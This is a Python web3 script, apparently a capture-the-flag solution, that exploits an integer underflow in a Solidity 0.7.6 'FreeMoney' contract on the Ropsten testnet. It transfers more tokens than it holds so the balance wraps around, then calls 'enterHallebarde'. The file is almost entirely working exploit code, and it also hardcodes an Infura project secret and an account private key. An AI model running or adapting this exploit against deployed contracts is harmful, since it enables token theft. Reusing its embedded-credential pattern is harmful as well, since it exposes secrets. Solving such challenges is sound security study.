#!/usr/bin/env python3

from web3 import Web3
from solcx import compile_source
import os
from eth_account import Account
#from eth_account.signers.local import LocalAccount
#from web3.auto import w3
from web3.middleware import construct_sign_and_send_raw_middleware
from datetime import datetime as dt
import binascii

PID = "af9b1a98447e4354bbb472d5dde82d6b"
PSEC = "81bd2e4ddc524088a980fe7e90b28c0e"
PROV_WSS = "wss://ropsten.infura.io/ws/v3/af9b1a98447e4354bbb472d5dde82d6b"
C_ADDR = "0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6"
ABI_FILE = "FreeMoney.sol"
BENEF = C_ADDR

MY_ADDR = "0x02DCfeeA048cEed820F97f532863A72FC75602C7"
MY_KEY = "0xb80ebf73cb74f6a330fb8e30687e9faf0b5c5ea89e1265b05ca9ae605b245e5c"

# solidity v7.6 -> underflow possible from transfer
# reset() if needed
# getMoney(1000)
# transfer(C_ADDR, 10000)to underflow our token count
# enterHallebarde() we should have a pentillion ether now
# optionnal : getMembershipStatus()

def connect():
    w3 = Web3(Web3.WebsocketProvider(PROV_WSS))
    account = Account.from_key(MY_KEY)
    w3.middleware_onion.add(construct_sign_and_send_raw_middleware(account))
    print(f"Monitor at https://ropsten.etherscan.io/address/{MY_ADDR}")
    return w3, account

def trans(w3, act, ctr, func, args):
    #gl = w3.eth.getBlock("latest").gasLimit
    t = {
            "nonce" : w3.eth.get_transaction_count(MY_ADDR),
            #"nonce" : 5,#int(dt.timestamp(dt.now())*1000), #w3.eth.get_transaction_count(MY_ADDR),
            "maxFeePerGas" : 2000000000,
            "maxPriorityFeePerGas" : 1000000000,
            "gas" : 300000 # I have no idea what I'm doing
    }
    fn = ctr.functions[func]
    txn = fn(*args).buildTransaction(t)
    sgn = act.sign_transaction(txn)
    tx_hash = w3.eth.send_raw_transaction(sgn.rawTransaction)
    print(f"Transaction : {binascii.hexlify(tx_hash)}")

def main():
    with open(ABI_FILE, "r") as sol:
        src = sol.read()
        cpl = compile_source(src, ["abi"], solc_version="0.7.6")
        cid, citf = cpl.popitem()
        abi = citf['abi']
    w3, act = connect()
    ctr = w3.eth.contract(address=C_ADDR, abi=abi)
    #trans(w3, act, ctr, "reset", [])
    #trans(w3, act, ctr, "getMoney", [100])
    #trans(w3, act, ctr, "transfer", [BENEF, 100000])
    trans(w3, act, ctr, "enterHallebarde", [])

main()

